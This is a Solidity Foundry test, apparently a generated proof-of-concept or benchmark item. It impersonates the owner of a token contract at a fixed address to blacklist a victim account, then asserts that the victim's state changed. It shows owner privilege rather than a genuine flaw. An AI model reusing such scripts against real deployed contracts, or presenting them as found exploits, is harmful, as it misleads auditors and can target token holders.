// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    ITokenTool token;
    address victim = address(0xdeadbeef);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ITokenTool(TARGET);
        vm.label(TARGET, "TokenTool Contract");
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // The precondition states the attacker is the owner, so we get the owner and prank them.
        address owner = token.owner();
        vm.label(owner, "Original Owner");

        // Prepare the arguments for the function call.
        address[] memory victims = new address[](1);
        victims[0] = victim;

        // Impersonate the owner and call the function to blacklist the victim.
        vm.prank(owner);
        token.multipleBotlistAddress(victims, true);

        // The oracle will automatically check if the victim is blacklisted.
        assertEq(token._isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
